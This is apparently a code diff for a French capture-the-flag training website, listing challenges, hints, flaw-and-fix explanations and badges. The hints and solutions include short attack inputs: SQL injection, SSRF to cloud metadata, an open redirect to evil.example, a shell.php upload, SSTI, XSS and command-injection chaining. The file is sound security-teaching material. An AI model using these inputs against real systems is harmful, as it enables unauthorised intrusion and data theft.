+  {id:"g20",name:"Mentions legales", pts:30, cat:"Debutant", diff:1, hint:"Lis les mentions legales (#cgv) jusqu'au bout : un flag y est ecrit noir sur blanc."},
+  {id:"g13",name:"Plan du site", pts:30, cat:"Debutant", diff:1, hint:"Le plan du site (#sitemap) liste toutes les pages. L'une des entrees est un flag."},
+  {id:"g17",name:"Reponse de la FAQ", pts:30, cat:"Debutant", diff:1, hint:"Dans la FAQ (#faq), deplie toutes les reponses : l'une d'elles contient un flag."},
+  {id:"g8", name:"Base64 des CGV", pts:40, cat:"Encodage", diff:1, hint:"Les mentions legales (#cgv) affichent une chaine base64. Decode-la (tout en ligne ou atob)."},
+  {id:"g9", name:"Flag a l'envers", pts:35, cat:"Encodage", diff:1, hint:"La FAQ (#faq) affiche un flag ecrit a l'envers. Lis-le de droite a gauche."},
+  {id:"g10",name:"Hexadecimal", pts:40, cat:"Encodage", diff:1, hint:"Le plan du site (#sitemap) donne une suite d'octets en hexadecimal. Convertis chaque octet en caractere ASCII."},
+  {id:"g11",name:"Binaire", pts:40, cat:"Encodage", diff:1, hint:"Le plan du site (#sitemap) donne une suite d'octets en binaire (8 bits). Convertis en ASCII."},
+  {id:"g12",name:"Morse", pts:40, cat:"Encodage", diff:1, hint:"La FAQ (#faq) contient un message en morse. Traduis les points et traits."},
+  {id:"g18",name:"Chiffre Atbash", pts:40, cat:"Encodage", diff:1, hint:"La FAQ (#faq) montre un flag en Atbash (A<->Z, B<->Y...). Miroir de l'alphabet."},
+  {id:"g19",name:"En-tete HTTP debug", pts:35, cat:"Debutant", diff:1, hint:"La page Reseau (#reseau) affiche les en-tetes HTTP d'une reponse. Un en-tete X-... porte un flag."},
+  // --- DevSecOps / CI-CD (page #pipeline) ---
+  {id:"ci1",name:"Secret en dur dans la CI", pts:100, cat:"DevSecOps", diff:2, hint:"Sur #pipeline, ouvre le fichier de configuration de la CI (.gitlab-ci.yml). Une cle d'API y est ecrite en dur."},
+  {id:"ci6",name:"Jeton dans les logs", pts:100, cat:"DevSecOps", diff:2, hint:"Les journaux d'execution du pipeline affichent les variables en clair. Un jeton de deploiement fuite dans la sortie du build."},
+  {id:"ci2",name:"Artefact .env expose", pts:125, cat:"DevSecOps", diff:2, hint:"L'etape build publie un artefact telechargeable. Le fichier .env a ete empaquete par erreur : telecharge-le."},
+  {id:"ci4",name:"Dockerfile bavard", pts:125, cat:"DevSecOps", diff:3, hint:"Le Dockerfile du pipeline copie tout le contexte et laisse un ARG secret. Lis-le dans l'onglet build."},
+  {id:"ci5",name:"Dependance vulnerable", pts:125, cat:"DevSecOps", diff:3, hint:"L'etape scan (SCA) remonte une dependance avec une CVE critique. Le rapport contient le flag."},
+  {id:"ci3",name:".git expose en prod", pts:150, cat:"DevSecOps", diff:3, hint:"L'etape deploy publie le dossier .git. Depuis #pipeline, consulte /.git/config du site deploye."},
+  {id:"ci7",name:"Pipeline sans controle", pts:175, cat:"DevSecOps", diff:4, hint:"La CI n'exige ni revue ni etape de securite bloquante : un deploiement part en prod malgre un scan en echec. Declenche-le."},
+  // --- Achat / logique d'e-commerce ---
+  {id:"a1",name:"Prix negocie cote client", pts:125, cat:"Achat", diff:2, hint:"Sur une fiche produit, le prix propose est modifiable (champ 'faire une offre'). Le panier fait confiance au prix envoye : propose 1 euro."},
+  {id:"a2",name:"Commande d'un autre client", pts:150, cat:"Achat", diff:3, hint:"Apres une commande, le suivi est a l'adresse #commande-1042. Change le numero pour consulter la commande d'un autre client (IDOR)."},
+  {id:"a3",name:"Bon cadeau devinable", pts:125, cat:"Achat", diff:2, hint:"Les bons cadeaux suivent un format sequentiel BA42-0001, BA42-0002... Devine un code valide dans le panier."},
+  {id:"a4",name:"Attribution de credit", pts:150, cat:"Achat", diff:3, hint:"Le formulaire de profil (#profil) n'envoie que le nom cote visible, mais accepte des champs caches. Ajoute 'credit' ou 'role' a la requete (mass assignment)."},
+  // --- Back-office / l'envers du decor ---
+  {id:"b1",name:"Back-office sans authentification", pts:150, cat:"Backoffice", diff:3, hint:"Le back-office #backoffice n'est relie a aucun menu et ne verifie aucune session : il suffit de connaitre l'adresse (forced browsing)."},
+  {id:"b2",name:"Fuite de donnees clients", pts:150, cat:"Backoffice", diff:3, hint:"Dans le back-office, l'onglet Clients affiche emails, telephones et adresses en clair, sans controle d'acces."},
+  {id:"b4",name:"API utilisateurs non protegee", pts:175, cat:"Backoffice", diff:4, hint:"Le back-office consomme /api/users. Cette API renvoie tous les comptes (dont le hash admin) sans authentification. Appelle-la."},
+  {id:"b3",name:"Secret dans les parametres", pts:150, cat:"Backoffice", diff:3, hint:"L'onglet Parametres du back-office affiche la configuration de l'application, cle secrete comprise."},
+  // --- Failles web supplementaires (onglet Outils du back-office + connexion) ---
+  {id:"w1",name:"CSRF (promotion admin)", pts:150, cat:"Web", diff:3, hint:"Dans le back-office, onglet Outils : l'action 'promouvoir' se declenche en GET sans jeton anti-CSRF. Un simple lien suffit a promouvoir un compte."},
+  {id:"w2",name:"SSRF (metadonnees)", pts:175, cat:"Web", diff:4, hint:"Le testeur d'URL (onglet Outils) va chercher l'adresse que tu donnes cote serveur. Vise une ressource interne : http://169.254.169.254/latest/meta-data/."},
+  {id:"w3",name:"Redirection ouverte", pts:100, cat:"Web", diff:2, hint:"La page de connexion accepte un parametre de redirection. Mets une URL externe (https://evil.example) : le site redirige sans verifier."},
+  {id:"w4",name:"Upload non restreint", pts:150, cat:"Web", diff:3, hint:"L'onglet Outils permet d'importer un 'catalogue'. Aucune extension n'est filtree : envoie un fichier shell.php (le nom suffit pour la demo)."},
+  {id:"w5",name:"Connexion sans limitation", pts:125, cat:"Force brute", diff:3, hint:"Le formulaire de connexion n'a aucune limite d'essais. Enchaine une dizaine de tentatives echouees sur le compte admin."},
+  // --- Blue team : SOC (analyse d'alertes) ---
+  {id:"soc1",name:"Triage : le vrai positif", pts:125, cat:"SOC", diff:2, hint:"Sur #soc, onglet Alertes : la plupart sont du bruit (faux positifs). Une seule correspond a une vraie compromission. Clique dessus pour la trier."},
+  {id:"soc2",name:"Correler l'IP attaquante", pts:150, cat:"SOC", diff:3, hint:"Onglet Logs du SOC : une IP revient dans les echecs de connexion PUIS dans une exfiltration. Selectionne cette IP pour confirmer l'attaquant."},
+  {id:"soc3",name:"Identifier l'IOC", pts:150, cat:"SOC", diff:3, hint:"Onglet IOC du SOC : parmi les domaines contactes, un seul est un C2 malveillant (TLD douteux, DGA). Marque le bon."},
+  // --- Blue team : EDR (reponse sur poste) ---
+  {id:"edr1",name:"Processus malveillant", pts:150, cat:"EDR", diff:3, hint:"Sur #edr, arbre de processus : repere l'enfant anormal (ex. powershell lance par Word avec une commande encodee). Clique-le."},
+  {id:"edr2",name:"Detecter la persistance", pts:150, cat:"EDR", diff:3, hint:"Onglet Persistance de l'EDR : une entree de demarrage automatique a ete ajoutee par l'attaquant. Identifie-la."},
+  {id:"edr3",name:"Isoler et mettre en quarantaine", pts:150, cat:"EDR", diff:3, hint:"Onglet Reponse de l'EDR : isole l'hote compromis et mets le fichier malveillant en quarantaine pour stopper l'attaque."},
+  // --- Reverse engineering ---
+  {id:"rev1",name:"Chaine obfusquee", pts:125, cat:"Reverse", diff:2, hint:"Sur #reverse, onglet Chaine : le code construit une chaine a partir d'echappements hexadecimaux (\\xNN). Convertis chaque octet en caractere."},
+  {id:"rev2",name:"Crackme XOR", pts:175, cat:"Reverse", diff:4, hint:"Onglet Crackme : la fonction XOR chaque caractere du mot de passe avec une cle, puis compare a un tableau cible. Inverse l'operation (cible XOR cle) pour retrouver le mot de passe."},
+  // --- Reseau / analyse de capture ---
+  {id:"net1",name:"Identifiants en clair (HTTP)", pts:125, cat:"Reseau", diff:2, hint:"Sur #capture : une trame HTTP POST transporte un formulaire de connexion en clair. Le mot de passe EST le flag."},
+  {id:"net2",name:"Exfiltration DNS", pts:175, cat:"Reseau", diff:4, hint:"Sur #capture, onglet DNS : les sous-domaines des requetes sont de l'hexadecimal. Concatene-les et convertis en ASCII."},
+  {id:"net3",name:"Beacon C2", pts:150, cat:"Reseau", diff:3, hint:"Sur #capture : une requete periodique vers xk9-update.top porte un en-tete inhabituel. Lis sa valeur."},
+  // --- DFIR : timeline d'incident ---
+  {id:"tl1",name:"Reconstituer la timeline", pts:175, cat:"DFIR", diff:3, hint:"Sur #timeline : remets les 6 evenements de l'attaque dans l'ordre chronologique (de la reconnaissance a l'exfiltration), puis valide."},
+  // --- Crypto avancee ---
+  {id:"cry1",name:"Chiffre de Vigenere", pts:150, cat:"Crypto", diff:3, hint:"Sur #crypto, onglet Vigenere : le texte est chiffre avec une cle repetee donnee. Dechiffre-le (decalage inverse lettre par lettre)."},
+  {id:"cry2",name:"XOR a cle courte", pts:150, cat:"Crypto", diff:3, hint:"Onglet XOR : les octets hex sont XORes avec une cle courte fournie, repetee. Applique le XOR pour retrouver le texte."},
+  {id:"cry3",name:"RSA a module faible", pts:200, cat:"Crypto", diff:4, hint:"Onglet RSA : le module n est petit. Factorise-le en p et q (deux nombres premiers) pour casser la cle."},
+  // --- Forensic / DFIR ---
+  {id:"for1",name:"Cle de registre suspecte", pts:150, cat:"DFIR", diff:3, hint:"Sur #forensic, onglet Registre : une cle de demarrage automatique a ete ajoutee par l'attaquant. Clique la bonne."},
+  {id:"for2",name:"Journal d'evenements", pts:150, cat:"DFIR", diff:3, hint:"Onglet Journal : parmi les evenements Windows, repere la connexion suspecte (4624 depuis une IP etrangere). Clique-la."},
+  // --- Analyse de phishing ---
+  {id:"phi1",name:"Email de phishing", pts:150, cat:"Phishing", diff:3, hint:"Sur #phishing : analyse l'en-tete de l'email. Clique l'indice qui prouve l'usurpation (SPF/DKIM en echec, expediteur falsifie)."}
+];
+
+/* explications pedagogiques : faille + correctif (spoiler) */
+const SOLUTIONS={
+  f1:"Faille : un secret laisse dans un commentaire HTML. Methode : afficher le code source (Ctrl+U). Correctif : ne jamais mettre d'info sensible cote client, nettoyer les commentaires au build.",
+  f2:"Faille : robots.txt revele les chemins qu'on veut cacher (securite par l'obscurite). Methode : lire #robots puis visiter #sauvegarde. Correctif : proteger les ressources par authentification, pas en les listant dans robots.txt.",
+  f19:"Faille : log de debug laisse en production. Methode : ouvrir la console (F12). Correctif : retirer les logs sensibles, desactiver le mode debug en prod.",
+  f3:"Faille : IDOR (reference directe non controlee). Methode : changer l'identifiant dans l'URL (#produit-99) pour atteindre une ressource masquee. Correctif : verifier les droits d'acces cote serveur sur chaque objet.",
+  f4:"Faille : logique metier non validee (quantite negative). Methode : saisir une quantite < 0 pour inverser le total. Correctif : valider les bornes cote serveur (quantite >= 1), recalculer le prix cote serveur.",
+  f11:"Faille : code promo rejouable, remise cumulable. Methode : appliquer le meme code plusieurs fois. Correctif : marquer un code comme consomme, plafonner la remise, recalculer cote serveur.",
+  f10:"Faille : secret seulement encode (ROT13), pas chiffre. Methode : decaler de 13 lettres. Correctif : ne jamais confondre encodage et chiffrement ; gerer les codes cote serveur.",
+  f18:"Faille : message sensible en chiffre de Cesar (cle triviale). Methode : decaler de 7. Correctif : chiffrement moderne (AES) avec cles gerees, jamais de cesar/rot pour proteger un secret.",
+  f7:"Faille : cle de licence stockee en base64 (lisible). Methode : decoder avec atob. Correctif : stocker un hash/une reference, valider la licence cote serveur.",
+  f5:"Faille : injection SQL dans l'authentification. Methode : une entree comme ' OR '1'='1 rend la condition toujours vraie. Correctif : requetes parametrees (prepared statements), jamais de concatenation.",
+  f6:"Faille : role stocke et verifie cote client (session base64 modifiable). Methode : passer role:client a role:admin. Correctif : signer/chiffrer la session cote serveur et verifier le role cote serveur.",
+  f17:"Faille : JWT acceptant alg:none (signature ignoree). Methode : forger un jeton d'en-tete alg:none avec role admin. Correctif : imposer un algorithme (HS256/RS256) et rejeter none, verifier la signature.",
+  f16:"Faille : jeton de reset previsible (base64 de login:date). Methode : le reconstruire pour l'admin. Correctif : jetons aleatoires cryptographiques, a usage unique et expiration courte.",
+  f15:"Faille : mot de passe hache en MD5 sans sel. Methode : attaque par dictionnaire. Correctif : bcrypt/argon2 avec sel, jamais MD5/SHA1 pour les mots de passe.",
+  f13:"Faille : traversee de chemin (path traversal). Methode : ../../ pour sortir du dossier autorise. Correctif : normaliser le chemin, liste blanche de fichiers, pas de nom de fichier venant de l'utilisateur.",
+  f12:"Faille : injection de commandes OS. Methode : chainer avec ; ou && apres l'hote. Correctif : ne pas passer d'entree a un shell ; utiliser des API sures, valider strictement l'entree.",
+  f14:"Faille : SSTI (gabarit evalue cote serveur). Methode : {{7*7}} puis acces a la config. Correctif : moteur de template sans eval, echappement, sandbox, pas d'entree utilisateur dans le template.",
+  f8:"Faille : XSS stocke (avis non filtre). Methode : injecter <img onerror> ou <script>. Correctif : echapper/assainir les sorties, Content-Security-Policy, bibliotheque de sanitisation.",
+  f20:"Faille : PIN a 4 chiffres sans limite d'essais (brute force). Methode : tester les 10000 combinaisons. Correctif : limiter les tentatives, temporisation, verrouillage, 2FA.",
+  f9:"Faille : chaine d'exploitation (escalade de role + PIN). Methode : devenir admin puis forcer le PIN. Correctif : defense en profondeur, controle d'acces serveur a chaque etape.",
+  g1:"Faille : flag dans un commentaire HTML. Methode : code source. Correctif : nettoyer les commentaires.",
+  g2:"Faille : secret dans un commentaire CSS. Methode : lire la balise <style>. Correctif : pas de secret cote client.",
+  g6:"Faille : donnee dans une balise meta. Methode : inspecter <head>. Correctif : ne pas exposer d'info interne dans les meta.",
+  g3:"Faille : flag dans un attribut aria-label/alt. Methode : inspecter l'element. Correctif : pas de secret dans les attributs HTML.",
+  g4:"Faille : flag dans un attribut data-*. Methode : inspecter le bouton. Correctif : pas de donnee sensible en data-*.",
+  g14:"Faille : flag dans une infobulle title. Methode : survol ou inspection. Correctif : rien de sensible dans les attributs.",
+  g7:"Faille : secret dans le stockage local. Methode : onglet Application > Local Storage. Correctif : ne rien stocker de sensible cote navigateur.",
+  g16:"Faille : flag dans un champ input hidden. Methode : inspecter le formulaire. Correctif : les champs caches ne sont pas secrets.",
+  g15:"Faille : info fuitee dans une page d'erreur 404. Methode : visiter une URL inexistante. Correctif : pages d'erreur generiques sans detail interne.",
+  g5:"Faille : texte masque en blanc sur blanc. Methode : tout selectionner. Correctif : ne pas 'cacher' par la couleur.",
+  g20:"Faille : secret visible dans les mentions legales. Methode : lire la page. Correctif : relire le contenu public avant publication.",
+  g13:"Faille : entree sensible dans le plan du site. Methode : lire #sitemap. Correctif : ne pas lister de ressource privee.",
+  g17:"Faille : secret dans une reponse de FAQ. Methode : deplier la section. Correctif : revue du contenu public.",
+  g8:"Faille : donnee en base64 (encodage). Methode : atob. Correctif : encodage != chiffrement.",
+  g9:"Faille : flag ecrit a l'envers. Methode : inverser la chaine. Correctif : l'inversion ne protege rien.",
+  g10:"Faille : donnee en hexadecimal. Methode : convertir chaque octet en ASCII. Correctif : encodage non protecteur.",
+  g11:"Faille : donnee en binaire. Methode : convertir en ASCII. Correctif : idem.",
+  g12:"Faille : message en morse. Methode : traduire points/traits. Correctif : encodage non protecteur.",
+  g18:"Faille : chiffre Atbash (miroir alphabet). Methode : A<->Z. Correctif : substitution triviale, a ne jamais utiliser pour un secret.",
+  g19:"Faille : secret dans un en-tete HTTP de debug. Methode : onglet Reseau. Correctif : retirer les en-tetes de debug en prod.",
+  ci1:"Faille : secret code en dur dans la config CI (.gitlab-ci.yml). Methode : lire le fichier de pipeline. Correctif : utiliser des variables CI protegees/masquees ou un coffre (Vault), jamais de secret dans le YAML versionne.",
+  ci6:"Faille : secrets affiches en clair dans les logs du build. Methode : lire la sortie du job. Correctif : masquer les variables (masked), ne jamais echo un secret, scanner les logs.",
+  ci2:"Faille : fichier .env empaquete dans l'artefact de build. Methode : telecharger l'artefact. Correctif : .dockerignore/.gitignore, liste blanche des fichiers d'artefact, scanner les artefacts.",
+  ci4:"Faille : Dockerfile qui COPY tout le contexte et laisse un ARG secret dans l'image. Methode : lire le Dockerfile/les couches. Correctif : COPY cible, multi-stage build, secrets via BuildKit --secret, jamais d'ARG secret.",
+  ci5:"Faille : dependance vulnerable (supply chain, CVE critique). Methode : lire le rapport SCA. Correctif : mettre a jour, SCA en etape bloquante, lockfile, verification d'integrite.",
+  ci3:"Faille : dossier .git deploye en production (fuite du code source). Methode : consulter /.git/config. Correctif : exclure .git du deploiement, servir uniquement le build, bloquer l'acces aux fichiers caches.",
+  ci7:"Faille : pipeline sans garde-fou (deploiement malgre un scan en echec, pas de revue). Methode : lancer le deploy en etat 'failed'. Correctif : etapes de securite bloquantes, revue obligatoire, environnements proteges, 'needs' sur les jobs de scan.",
+  a1:"Faille : prix controle par le client (parameter tampering). Methode : envoyer un prix arbitraire a l'ajout au panier. Correctif : toujours relire le prix depuis la base cote serveur, ignorer tout prix venant du client.",
+  a2:"Faille : IDOR sur les commandes (reference non controlee). Methode : incrementer/decrementer le numero de commande dans l'URL. Correctif : verifier que la commande appartient a l'utilisateur connecte.",
+  a3:"Faille : codes de bons cadeaux sequentiels et devinables. Methode : essayer BA42-0001, 0002... Correctif : codes aleatoires longs, limitation du taux, verrouillage apres essais.",
+  a4:"Faille : mass assignment (le serveur affecte tous les champs recus). Methode : ajouter un champ 'credit' ou 'role' au formulaire de profil. Correctif : liste blanche des champs modifiables, ne jamais lier directement l'entree a l'objet.",
+  b1:"Faille : controle d'acces manquant au niveau fonction (forced browsing). Methode : ouvrir #backoffice directement. Correctif : exiger une authentification et un role serveur sur chaque page d'admin, pas seulement masquer le lien.",
+  b2:"Faille : exposition de donnees personnelles (PII) sans controle. Methode : lire l'onglet Clients du back-office. Correctif : controle d'acces, minimisation des donnees, masquage/chiffrement, journalisation des acces.",
+  b4:"Faille : API sensible non authentifiee (/api/users renvoie tout). Methode : appeler l'endpoint. Correctif : authentification + autorisation sur l'API, ne jamais exposer les hash, pagination et filtrage cote serveur.",
+  b3:"Faille : secret de configuration expose dans l'interface d'admin. Methode : lire l'onglet Parametres. Correctif : ne pas afficher les secrets, les stocker dans un coffre, variables d'environnement cote serveur.",
+  w1:"Faille : CSRF (action sensible en GET sans jeton). Methode : un lien/formulaire externe declenche la promotion. Correctif : jeton anti-CSRF par requete, SameSite cookies, actions sensibles en POST avec re-authentification.",
+  w2:"Faille : SSRF (le serveur requete une URL fournie par l'utilisateur). Methode : pointer vers une IP/metadonnees internes (169.254.169.254). Correctif : liste blanche de domaines, bloquer les plages internes, resoudre et valider l'hote, pas de redirection suivie.",
+  w3:"Faille : redirection ouverte (open redirect). Methode : parametre redirect vers un domaine externe. Correctif : n'autoriser que des chemins internes relatifs, liste blanche d'URLs, ignorer les cibles absolues.",
+  w4:"Faille : upload non restreint (type/extension non valides). Methode : envoyer un fichier executable. Correctif : liste blanche d'extensions et de types MIME, renommer, stocker hors webroot, scanner, pas d'execution du dossier d'upload.",
+  w5:"Faille : absence de limitation d'essais a la connexion (brute force). Methode : repeter les tentatives sans blocage. Correctif : limitation du taux, verrouillage temporaire, captcha, MFA, journalisation des echecs.",
+  soc1:"Analyse : triage d'alertes. Le vrai positif etait la connexion admin reussie apres 300 echecs depuis une IP etrangere (brute force aboutie), noyee dans des alertes benignes. Bonne pratique : prioriser par criticite et contexte, reduire le bruit (tuning des regles).",
+  soc2:"Analyse : correlation. La meme IP 203.0.113.66 apparait dans les echecs d'authentification puis dans un gros transfert sortant : c'est l'attaquant. Bonne pratique : correler plusieurs sources (auth, reseau, proxy) sur un meme indicateur.",
+  soc3:"Analyse : IOC. Le domaine de C2 etait xk9-update[.]top (TLD douteux, nom type DGA), parmi des domaines legitimes. Bonne pratique : threat intel, reputation de domaine, blocage et recherche retroactive de l'IOC.",
+  edr1:"Analyse : detection sur poste. Le processus malveillant est powershell.exe lance par winword.exe avec une commande -enc (base64) : chaine d'execution typique d'un document piege. Bonne pratique : regles comportementales parent/enfant, blocage des macros.",
+  edr2:"Analyse : persistance. L'attaquant a ajoute une cle Run (HKCU\\...\\Run) pointant vers un script dans %APPDATA% : relance a chaque ouverture de session. Bonne pratique : surveiller les points de persistance (Run keys, taches planifiees, services).",
+  edr3:"Reponse : containment. Isoler l'hote du reseau et mettre le binaire en quarantaine stoppe la progression sans detruire les preuves. Bonne pratique : isolation reseau, quarantaine, collecte forensique, puis eradication et remediation.",
+  rev1:"Reverse : la chaine est obfusquee en echappements \\xNN (hex). En convertissant chaque octet (43->C, 54->T...) on reconstruit le flag. Methode : lire le code, decoder a la main ou en console. Lecon : l'obfuscation ralentit mais ne protege pas un secret cote client.",
+  rev2:"Reverse : crackme. Le code fait motdepasse[i] XOR cle[i] == cible[i]. On inverse : motdepasse[i] = cible[i] XOR cle[i], ce qui donne 'r3v3rs3'. Le bon mot de passe affiche le flag. Lecon : un controle cote client se contourne toujours en lisant la logique.",
+  net1:"Reseau : HTTP n'est pas chiffre. Le POST de connexion transporte login et password en clair, lisibles dans la capture. Lecon : toujours du HTTPS/TLS ; jamais d'identifiants sur un canal clair.",
+  net2:"Reseau : exfiltration par DNS. Les donnees volees sont encodees (hex) dans les sous-domaines des requetes DNS vers le domaine attaquant, puis reassemblees. Lecon : surveiller les requetes DNS anormalement longues/nombreuses, filtrer le DNS sortant.",
+  net3:"Reseau : balise (beacon) C2. Des requetes periodiques vers xk9-update.top avec un en-tete/User-Agent porteur signalent un implant qui contacte son serveur. Lecon : detecter la periodicite et les destinations suspectes (reputation, JA3).",
+  tl1:"DFIR : la chronologie correcte est reconnaissance (scan) -> brute force -> connexion reussie -> execution (macro/powershell) -> persistance -> exfiltration. Lecon : une timeline relie les evenements de plusieurs sources pour raconter l'incident et guider la remediation.",
+  cry1:"Crypto : Vigenere avec cle repetee 'BAIE'. On dechiffre lettre par lettre en soustrayant la cle (les chiffres et symboles restent). Lecon : un chiffrement a cle courte et repetee se casse (analyse de frequence, cle devinee).",
+  cry2:"Crypto : XOR a cle courte 'cle', repetee sur le message. En reappliquant le XOR avec la cle on retrouve le clair. Lecon : XOR a cle courte reutilisee = cassable (XOR de deux chiffres, attaque par cle probable).",
+  cry3:"Crypto : RSA avec un module n=25777 = 149 x 173. Un module aussi petit se factorise instantanement, ce qui donne p et q puis la cle privee. Lecon : la securite de RSA repose sur la difficulte de factoriser un GRAND n (2048 bits+).",
+  for1:"Forensic : persistance par cle de registre. L'entree HKCU\\...\\Run pointant vers un script dans %APPDATA% relance le malware a chaque session. Lecon : auditer les points de demarrage automatique (Run keys, taches, services).",
+  for2:"Forensic : journal d'evenements Windows. L'event 4624 (ouverture de session reussie) depuis une IP etrangere, juste apres des 4625 (echecs), trahit un acces illegitime. Lecon : correler les journaux d'authentification, alerter sur les connexions anormales.",
+  phi1:"Phishing : l'en-tete montre SPF=fail et DKIM=fail, et un 'From' affiche different du domaine d'envoi reel : usurpation. Lecon : verifier SPF/DKIM/DMARC, se mefier des domaines proches, ne pas cliquer les liens/pieces jointes."
+};
+
+const BADGES=[
+  {id:"first", name:"Premier sang", desc:"Trouver un premier flag", test:f=>f.length>=1},
+  {id:"ten", name:"Dans le bain", desc:"Trouver 10 flags", test:f=>f.length>=10},
+  {id:"half", name:"A mi-chemin", desc:"Trouver 20 flags", test:f=>f.length>=20},
+  {id:"easy", name:"Echauffement complet", desc:"Tous les defis faciles", test:f=>CHALLENGES.filter(c=>c.diff===1).every(c=>f.includes(c.id))},
+  {id:"crypto", name:"Cryptanalyste", desc:"Toute la categorie Crypto + Encodage", test:f=>CHALLENGES.filter(c=>c.cat==="Crypto"||c.cat==="Encodage").every(c=>f.includes(c.id))},
+  {id:"expert", name:"Expert confirme", desc:"Tous les defis experts", test:f=>CHALLENGES.filter(c=>c.diff===4).every(c=>f.includes(c.id))},
+  {id:"devsecops", name:"DevSecOps", desc:"Toute la categorie CI/CD", test:f=>CHALLENGES.filter(c=>c.cat==="DevSecOps").every(c=>f.includes(c.id))},
+  {id:"shopper", name:"Client averti", desc:"Toute la categorie Achat", test:f=>CHALLENGES.filter(c=>c.cat==="Achat").every(c=>f.includes(c.id))},
+  {id:"backstage", name:"Dans les coulisses", desc:"Tout le back-office", test:f=>CHALLENGES.filter(c=>c.cat==="Backoffice").every(c=>f.includes(c.id))},
+  {id:"blueteam", name:"Analyste SOC", desc:"Toutes les epreuves SOC et EDR", test:f=>CHALLENGES.filter(c=>c.cat==="SOC"||c.cat==="EDR").every(c=>f.includes(c.id))},
+  {id:"reverser", name:"Reverser", desc:"Toutes les epreuves Reverse", test:f=>CHALLENGES.filter(c=>c.cat==="Reverse").every(c=>f.includes(c.id))},
+  {id:"sniffer", name:"Analyste reseau", desc:"Toutes les epreuves Reseau", test:f=>CHALLENGES.filter(c=>c.cat==="Reseau").every(c=>f.includes(c.id))},
+  {id:"cryptologue", name:"Cryptologue", desc:"Toute la categorie Crypto", test:f=>CHALLENGES.filter(c=>c.cat==="Crypto").every(c=>f.includes(c.id))},
+  {id:"forensicator", name:"Forensicator", desc:"Toutes les epreuves DFIR", test:f=>CHALLENGES.filter(c=>c.cat==="DFIR").every(c=>f.includes(c.id))},
+  {id:"full", name:"Sans faille (ironique)", desc:"Tous les flags", test:f=>f.length>=CHALLENGES.length},
+  {id:"speed", name:"Rapide comme l'eclair", desc:"Tout finir en moins de 30 min", test:f=>{if(f.length<CHALLENGES.length)return false;const b=parseInt(sGet("baie42_best","0"),10);return b&&b<=30*60*1000}}
+];
+
+function found(){try{return JSON.parse(sGet("baie42_flags","[]"))}catch(e){return []}}
+function fmtTime(ms){if(!ms||ms<0)return "--:--";const s=Math.floor(ms/1000),h=Math.floor(s/3600),m=Math.floor(s%3600/60),ss=s%60;return (h?String(h).padStart(2,"0")+":":"")+String(m).padStart(2,"0")+":"+String(ss).padStart(2,"0")}
+function toast(txt,kind){let t=document.getElementById("toast");if(!t){t=document.createElement("div");t.id="toast";document.body.appendChild(t)}t.className=(kind||"ok");t.textContent=txt;t.classList.remove("show");void t.offsetWidth;t.classList.add("show");clearTimeout(toast._t);toast._t=setTimeout(()=>t.classList.remove("show"),3200)}
+function markFound(id){const f=found();if(!f.includes(id)){
+    if(f.length===0&&!sGet("baie42_start",null))sSet("baie42_start",String(Date.now()));
+    f.push(id);sSet("baie42_flags",JSON.stringify(f));
+    const ch=CHALLENGES.find(c=>c.id===id);toast("Flag valide : "+(ch?ch.name:id)+" (+"+(ch?ch.pts:0)+" pts)","ok");
+    if(f.length===CHALLENGES.length){const start=parseInt(sGet("baie42_start","0"),10);if(start){const dur=Date.now()-start;const best=parseInt(sGet("baie42_best","0"),10);if(!best||dur<best)sSet("baie42_best",String(dur));
+      let board=[];try{board=JSON.parse(sGet("baie42_board","[]"))}catch(e){}board.push({ms:dur,date:Date.now(),hints:(function(){try{return JSON.parse(sGet("baie42_hints","[]")).length}catch(e){return 0}})()});board.sort((a,b)=>a.ms-b.ms);sSet("baie42_board",JSON.stringify(board.slice(0,10)));}}
+  }updateBadges()}
+function hintsUsed(){try{return JSON.parse(sGet("baie42_hints","[]"))}catch(e){return []}}
+function useHint(id){const h=hintsUsed();if(!h.includes(id)){h.push(id);sSet("baie42_hints",JSON.stringify(h))}}
+function hintPenalty(){const h=hintsUsed(),f=found();return CHALLENGES.filter(c=>h.includes(c.id)&&f.includes(c.id)).reduce((a,c)=>a+Math.ceil(c.pts*0.3),0)}
+function checkEdr3(){const iso=sGet("baie42_edr_iso","0")==="1",q=sGet("baie42_edr_q","0")==="1",m=document.getElementById("edrRespMsg");
+  if(iso&&q){markFound("edr3");if(m)m.innerHTML=`<div class="notice ok">Hote isole et fichier en quarantaine : l'attaque est confinee, les preuves preservees. Flag : <span class="flag">${esc(F("edr3"))}</span></div>`}
+  else if(m)m.innerHTML=`<div class="notice">${iso?"Hote isole. ":""}${q?"Fichier en quarantaine. ":""}Il reste a ${iso?"":"isoler l'hote"}${(!iso&&!q)?" et ":""}${q?"":"mettre le fichier en quarantaine"}.</div>`}
+
+/* ---- dessins SVG ---- */
+function ears(w,h){return `<rect x="0" y="0" width="14" height="${h}" fill="var(--metal-2)"/><rect x="${w-14}" y="0" width="14" height="${h}" fill="var(--metal-2)"/><circle cx="7" cy="${h/2}" r="3" fill="var(--hole)"/><circle cx="${w-7}" cy="${h/2}" r="3" fill="var(--hole)"/>`}
+function chassis(w,h){return `<rect x="14" y="1" width="${w-28}" height="${h-2}" rx="2" fill="var(--steel)"/>`+ears(w,h)}
+function portRow(x0,y,n,pw,gap){let s="";for(let i=0;i<n;i++){const x=x0+i*(pw+gap);s+=`<rect x="${x}" y="${y}" width="${pw}" height="9" rx="1" fill="var(--hole)"/><rect x="${x+1.5}" y="${y+1}" width="${pw-3}" height="2" fill="var(--metal-2)"/>`}return s}
+function leds(x0,y,n,step,col){let s="";for(let i=0;i<n;i++)s+=`<rect x="${x0+i*step}" y="${y}" width="${Math.max(2,step-3)}" height="2" fill="${(i*7)%5===0?"var(--amber)":col}"/>`;return s}
+const DRAW={
+  switch24(){const w=480,h=44;return chassis(w,h)+`<rect x="24" y="8" width="58" height="28" rx="2" fill="var(--steel-2)"/><text x="30" y="26" font-family="IBM Plex Sans Condensed,Arial Narrow,sans-serif" font-size="11" font-weight="700" fill="var(--panel)">S24 PoE+</text>`+portRow(96,8,12,15,4)+portRow(96,24,12,15,4)+leds(96,4,12,19,"var(--led)")+`<rect x="336" y="10" width="22" height="24" rx="1" fill="var(--hole)"/><rect x="362" y="10" width="22" height="24" rx="1" fill="var(--hole)"/><rect x="392" y="12" width="56" height="18" rx="2" fill="var(--steel-2)"/><circle cx="458" cy="21" r="3" fill="var(--led)"/>`},
